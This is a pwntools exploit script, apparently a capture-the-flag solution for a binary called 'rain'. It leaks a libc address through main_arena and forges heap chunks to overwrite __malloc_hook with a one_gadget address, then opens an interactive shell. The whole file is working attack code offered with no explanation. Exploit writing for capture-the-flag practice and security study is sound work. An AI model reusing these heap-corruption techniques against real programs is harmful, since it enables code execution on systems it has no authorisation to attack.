#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(" ")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./rain"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))

cmd = lambda cho : p.sendlineafter(b'ch> ', str(cho).encode())
def debugPID():
	lg("p.pid")
	input()

def config(frame):
	cmd(1)
	ru(b'FRAME> ')
	sn(frame.ljust(18, b"\x00"))

l.symbols['main_arena'] = 0x3ebc40
frame_0 = p32(0x50)*2+p8(2)+p8(1)+p32(0x64)*2

frame = frame_0 + b"a"*0x80
config(frame)
for i in range(8):
	config(frame_0)
cmd(2)
ru(b"Table:")
libc_base = u64(ru(b"\n").replace(b" ", b"").ljust(8, b"\x00")) - l.symbols['main_arena'] - 96
lg("libc_base")


frame = frame_0 + p64(libc_base+l.symbols['main_arena'])
config(frame)

frame = frame_0 + b"a"*0x60
config(frame)

for i in range(7):
	config(frame_0)
frame_1 = p32(1)+p32(0x60)+p8(2)+p8(1)+p32(0x64)*2
frame = frame_1 + p64(libc_base + l.symbols['__malloc_hook'] - 0x23)*12
config(frame)
frame = frame_0 + b"a"*0x90
config(frame)
config(frame_0)
frame = frame_0 + b"a"*0x10
config(frame)
frame = frame_0 + b"a"*0x60
config(frame)

config(frame_1 + b"a"*0x60)
frame_2 = p32(0)*2+p8(2)+p8(1)+p32(0x64)*2
frame = frame_2 + b"a"*0xc0
config(frame)
config(frame_2)

frame = frame_2 + b"a"*0x10
config(frame)

one_gadget = libc_base+0x10a45c
payload = b'\x00'*(0x13-8) + p64(one_gadget)
payload = frame_2+payload.ljust(0x60,b'\x00')
config(payload)
config(payload)



irt()